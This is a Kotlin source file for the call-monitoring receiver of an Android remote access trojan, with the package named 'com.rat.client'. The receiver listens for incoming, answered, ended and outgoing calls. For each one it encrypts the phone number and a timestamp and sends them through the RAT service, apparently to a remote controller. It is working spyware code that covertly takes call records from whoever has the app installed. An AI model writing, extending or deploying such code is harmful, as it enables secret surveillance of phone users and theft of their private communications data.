package com.rat.client.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import android.util.Log
import com.rat.client.crypto.EncryptionUtils
import com.rat.client.service.RatService
import com.rat.client.util.DeviceUtils

class CallReceiver : BroadcastReceiver() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "CallReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return

        when (action) {
            TelephonyManager.ACTION_PHONE_STATE_CHANGED -> {
                val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
                val number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER) ?: ""
                handleCallStateChange(context, state, number)
            }
            Intent.ACTION_NEW_OUTGOING_CALL -> {
                val number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER) ?: ""
                handleOutgoingCall(context, number)
            }
        }
    }

    private fun handleCallStateChange(context: Context, state: String?, number: String) {
        val service = RatService.getInstance()
        val timestamp = System.currentTimeMillis()

        when (state) {
            TelephonyManager.EXTRA_STATE_RINGING -> {
                val data = mapOf(
                    "event" to "RINGING",
                    "number" to number,
                    "timestamp" to timestamp
                )
                service?.sendCommand("call_event", EncryptionUtils.encrypt(com.google.gson.Gson().toJson(data)))
            }
            TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                val data = mapOf(
                    "event" to "OFFHOOK",
                    "number" to number,
                    "timestamp" to timestamp
                )
                service?.sendCommand("call_event", EncryptionUtils.encrypt(com.google.gson.Gson().toJson(data)))
            }
            TelephonyManager.EXTRA_STATE_IDLE -> {
                val data = mapOf(
                    "event" to "IDLE",
                    "number" to number,
                    "timestamp" to timestamp
                )
                service?.sendCommand("call_event", EncryptionUtils.encrypt(com.google.gson.Gson().toJson(data)))
            }
        }
    }

    private fun handleOutgoingCall(context: Context, number: String) {
        val service = RatService.getInstance()
        val data = mapOf(
            "event" to "OUTGOING",
            "number" to number,
            "timestamp" to System.currentTimeMillis()
        )
        service?.sendCommand("call_event", EncryptionUtils.encrypt(com.google.gson.Gson().toJson(data)))
    }
}